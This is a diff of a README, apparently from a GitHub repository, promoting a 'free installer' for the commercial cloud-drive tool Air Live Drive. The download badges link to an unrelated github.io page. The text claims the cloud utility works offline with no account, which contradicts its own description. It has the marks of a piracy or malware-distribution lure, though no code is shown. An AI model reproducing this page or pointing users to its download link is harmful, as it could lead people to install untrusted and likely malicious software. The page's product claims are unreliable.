@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Cloud+Storage-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Air Live Drive Free Installer** — Air Live Drive is a Windows and macOS utility that mounts cloud storage services (Google Drive, OneDrive, Dropbox, S3) as local drive letters. Works without internet access, no account required. Full offline installation.
+**💻 Air Live Drive Free Installer** — Air Live Drive is a Windows and macOS application that connects cloud storage services as virtual drives on your desktop. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Air Live Drive](https://img.shields.io/badge/⬇_Install_Air%20Live%20Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Air Live Drive](https://img.shields.io/badge/⬇_Install_Air+Live+Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Air Live Drive
 
-Air Live Drive is a Windows and macOS utility that mounts cloud storage services (Google Drive, OneDrive, Dropbox, S3) as local drive letters. Access cloud files directly in any application as if they were local without syncing everything to disk.
+Air Live Drive is a Windows and macOS application that connects cloud storage services as virtual drives on your desktop. Mount Dropbox, Google Drive, OneDrive, Amazon S3, and dozens of other cloud services as local drives and access files directly without downloading everything locally. Work with cloud files using any application as if they were stored locally.
 
 ---
 
 ## ❌ Problem: Air Live Drive is hard to access
 
-- **Paid License** — Free tier limited to one cloud account
-- **Performance Dependent on Internet** — Drive access speed limited by internet connection speed
-- **Stability Issues** — Cloud drive mounting can disconnect during network interruptions
-- **Cloud Provider Dependency** — Must trust Air Live Drive with cloud storage OAuth tokens
+- **Internet Dependency** — Files accessed in real time; offline access limited
+- **Service Compatibility** — API changes in cloud services can break functionality
+- **Transfer Speed** — Dependent on internet connection speed for large file operations
+- **Commercial License** — Requires paid subscription for premium cloud service connections
 
 ---
 
@@ -81,7 +81,7 @@ Air Live Drive is a Windows and macOS utility that mounts cloud storage services
 
 <div align="center">
 
-[![⬇ Install Air Live Drive](https://img.shields.io/badge/⬇_Install_Air%20Live%20Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Air Live Drive](https://img.shields.io/badge/⬇_Install_Air+Live+Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ Air Live Drive is a Windows and macOS utility that mounts cloud storage services
 
 ---
 
-**Air Live Drive Free Installer** — Air Live Drive is a Windows and macOS utility that mounts cloud storage services (Google Drive, OneDrive, Dropbox, S3) as local drive letters. Install without internet connection today!
+**Air Live Drive Free Installer** — Air Live Drive is a Windows and macOS application that connects cloud storage services as virtual drives on your desktop. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Air Live Drive](https://img.shields.io/badge/⬇_Install_Air%20Live%20Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Air Live Drive](https://img.shields.io/badge/⬇_Install_Air+Live+Drive-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
